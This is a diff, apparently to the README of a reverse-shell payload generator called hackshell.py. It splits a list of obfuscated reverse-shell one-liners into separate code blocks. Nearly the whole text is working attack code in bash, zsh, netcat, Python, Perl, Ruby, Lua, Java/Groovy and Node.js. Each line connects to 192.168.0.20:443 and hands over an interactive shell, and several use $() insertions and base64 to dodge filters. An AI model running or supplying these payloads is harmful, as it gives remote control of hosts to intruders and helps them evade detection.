@@ -63,16 +63,34 @@ bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|
 `
 python hackshell.py --payload all --lhost 192.168.0.20 --lport 443
 `
+
 ```
 ba$()sh -$()i '/dev/tcp/192.168.0.20/443 0>&1'
+```
+```
 zsh -c 'zmodload zsh/net/tcp && ztcp192.168.0.20443&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+```
+```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c 192.168.0.20 443 >/tmp/f
+```
+php
+```
 py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.20",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+```
 pe$()rl -$()e 'use Socket;$i="192.168.0.20";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+```
 ru$()by -rsocket -$()e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.168.0.20",443))'
+```
+```
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('"192.168.0.20"','443');os.execute('sh -i <&3 >&3 2>&3');"     
+```
+```
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.0.20/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
+```
+```
 require('child_process').exec('nc -e sh 192.168.0.20 443')
 ```
